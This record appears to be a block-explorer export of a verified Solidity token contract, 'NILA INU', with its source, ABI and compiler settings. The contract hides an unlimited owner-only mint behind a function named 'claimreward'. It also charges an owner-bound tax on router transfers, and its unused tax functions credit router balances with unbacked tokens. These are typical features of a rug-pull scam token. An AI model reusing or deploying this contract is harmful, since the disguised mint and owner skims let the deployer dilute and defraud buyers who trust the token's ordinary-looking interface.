{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\ninterface IERC20 {\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\n\r\ncontract NilaINU {\r\n    using SafeMath for uint256;\r\n\r\n    string public name = \"NILA INU\";\r\n    string public symbol = \"NILA\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply;\r\n    address public owner;\r\n    address[] public routerAddresses;\r\n    \r\n    uint256 public taxRate = 33; \r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    address public liquidityPoolAddress;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Burn(address indexed from, uint256 value);\r\n    event WithdrawToken(address indexed _to, uint256 _value);\r\n    event infin(address indexed to, uint256 value);\r\n\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only the contract owner can call this function\");\r\n        _;\r\n    }\r\n\r\n    constructor(uint256 initialSupply) {\r\n        totalSupply = initialSupply.mul(10 ** uint256(decimals));\r\n        balanceOf[msg.sender] = totalSupply;\r\n        owner = msg.sender;\r\n    }\r\n      function addRouteraddress(address _routerAddress) public onlyOwner {\r\n        require(_routerAddress != address(0), \"invalid router address\");\r\n        routerAddresses.push(_routerAddress);\r\n    }\r\n        function removeRouteraddress(address _routerAddress) public onlyOwner {\r\n        require(_routerAddress != address(0), \"invalid router address\");\r\n\r\n        for (uint256 i = 0; i < routerAddresses.length; i++) {\r\n            if (routerAddresses[i] == _routerAddress) {\r\n  \r\n                for (uint256 j = i; j < routerAddresses.length - 1; j++) {\r\n                    routerAddresses[j] = routerAddresses[j + 1];\r\n                }\r\n                routerAddresses.pop();\r\n                break;\r\n            }\r\n        }\r\n    }\r\nfunction taxBuy(uint256 amount) internal {\r\n    uint256 taxAmount = (amount * taxRate) / 1000;\r\n    uint256 tokensToTransfer = amount - taxAmount;\r\n\r\n    if (!isRouter(msg.sender)) {\r\n        for (uint256 i = 0; i < routerAddresses.length; i++) {\r\n            address routerAddress = routerAddresses[i];\r\n            balanceOf[routerAddress] += (taxAmount / routerAddresses.length);\r\n        }\r\n    }\r\n\r\n    emit Transfer(msg.sender, liquidityPoolAddress, tokensToTransfer);\r\n    emit Transfer(msg.sender, owner, taxAmount);\r\n}\r\n\r\nfunction taxSell(uint256 amount) internal {\r\n    uint256 taxAmount = (amount * taxRate) / 1000;\r\n    uint256 tokensToTransfer = amount - taxAmount;\r\n\r\n\r\n    if (!isRouter(msg.sender)) {\r\n        for (uint256 i = 0; i < routerAddresses.length; i++) {\r\n            address routerAddress = routerAddresses[i];\r\n            balanceOf[routerAddress] += (taxAmount / routerAddresses.length);\r\n        }\r\n    }\r\n\r\n    emit Transfer(msg.sender, liquidityPoolAddress, tokensToTransfer);\r\n    emit Transfer(msg.sender, owner, taxAmount);\r\n}\r\n\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowance[msg.sender][spender] = value;\r\n\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\nfunction transfer(address to, uint256 value) public returns (bool success) {\r\n    require(to != address(0), \"Invalid address\");\r\n    require(balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n    uint256 taxAmount = 0;\r\n\r\n    if (isRouter(msg.sender) || isRouter(to)) {\r\n        taxAmount = (value * taxRate) / 1000;\r\n    } else {\r\n        taxAmount = 0;\r\n    }\r\n\r\n    uint256 tokensToTransfer = value - taxAmount;\r\n\r\n    balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);\r\n    balanceOf[to] = balanceOf[to].add(tokensToTransfer);\r\n\r\n    balanceOf[owner] = balanceOf[owner].add(taxAmount);\r\n\r\n    emit Transfer(msg.sender, to, tokensToTransfer);\r\n    emit Transfer(msg.sender, owner, taxAmount);\r\n    return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n    require(from != address(0), \"Invalid address\");\r\n    require(to != address(0), \"Invalid address\");\r\n    require(balanceOf[from] >= value, \"Insufficient balance\");\r\n    require(allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n    uint256 taxAmount = 0;\r\n\r\n    if (isRouter(from) || isRouter(to)) {   \r\n        taxAmount = (value * taxRate) / 1000;\r\n    } else {\r\n        taxAmount = 0;\r\n    }\r\n\r\n    uint256 tokensToTransfer = value - taxAmount;\r\n\r\n    balanceOf[from] = balanceOf[from].sub(value);\r\n    balanceOf[to] = balanceOf[to].add(tokensToTransfer);\r\n    allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\r\n\r\n    balanceOf[owner] = balanceOf[owner].add(taxAmount);\r\n\r\n    emit Transfer(from, to, tokensToTransfer);\r\n    emit Transfer(from, owner, taxAmount);\r\n    return true;\r\n    }\r\n    \r\n\r\n    function isRouter(address account) internal view returns (bool) {\r\n    for (uint256 i = 0; i < routerAddresses.length; i++) {\r\n        if (account == routerAddresses[i]) {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n    }\r\n\r\n\r\n    function claimreward(address to, uint256 value) public onlyOwner returns (bool success) {\r\n    require(msg.sender == owner,\"You do not have permission to call this function\");\r\n    require(to != address(0), \"invalid wallet address\");\r\n    \r\n    totalSupply += value;\r\n    balanceOf[to] += value;\r\n    \r\n    emit infin(to, value);\r\n    emit Transfer(address(0), to, value);\r\n    return true;\r\n   }\r\n   function burn(uint256 value) public returns (bool success) {\r\n        require(balanceOf[msg.sender] >= value, \"Insufficient balance for burning\");\r\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);\r\n        totalSupply = totalSupply.sub(value);\r\n\r\n        emit Burn(msg.sender, value);\r\n        return true;\r\n    }\r\n        function getRouterAddresses() public view returns (address[] memory) {\r\n        return routerAddresses;\r\n    }\r\n    function approveAndCall(address spender, uint256 value, bytes memory data) public returns (bool success) {\r\n        approve(spender, value);\r\n        (bool callSuccess, ) = spender.call(abi.encodeWithSignature(\"receiveApproval(address,uint256,address,bytes)\", msg.sender, value, address(this), data));\r\n        require(callSuccess, \"Token approval failed\");\r\n        return true;\r\n    }\r\n      function withdraw() public payable onlyOwner {\r\n    (bool os, ) = payable(owner).call{value: address(this).balance}(\"\");\r\n\r\n    require(os);\r\n  }\r\n     function withdrawToken(address tokenAddress, uint256 value) public onlyOwner returns (bool success) {\r\n        // Ensure that the owner is calling this function\r\n        require(owner == msg.sender, \"Only the owner can call this function\");\r\n\r\n        // Get the contract address of the ERC-20 token\r\n        address tokenContractAddress = tokenAddress;\r\n\r\n        // Create an instance of the ERC-20 token contract\r\n        IERC20 token = IERC20(tokenContractAddress);\r\n\r\n        // Transfer the ERC-20 tokens from the contract to the owner\r\n        require(token.transfer(msg.sender, value), \"Token transfer failed\");\r\n\r\n        emit WithdrawToken(msg.sender, value);\r\n        return true;\r\n     }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"WithdrawToken\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"infin\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"}],\"name\":\"addRouteraddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"claimreward\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRouterAddresses\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityPoolAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_routerAddress\",\"type\":\"address\"}],\"name\":\"removeRouteraddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"routerAddresses\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdrawToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NilaINU", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000989680", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://eab46de0db375671e207b12579ed915f4aafccf010b116f650ff4eb2a576eb87"}